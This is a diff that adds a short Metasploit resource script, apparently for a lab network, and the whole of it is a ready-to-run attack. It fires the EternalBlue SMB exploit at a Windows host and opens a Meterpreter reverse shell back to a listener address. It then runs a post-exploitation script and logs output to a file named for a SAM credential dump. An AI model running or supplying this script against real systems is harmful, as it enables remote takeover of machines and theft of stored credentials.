@@ -1,0 +1,7 @@
+use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set RHOST 172.16.64.64
+set LHOST 172.16.64.1
+set AutoRunScript post.rc
+spool /root/sam_dump.txt
+exploit
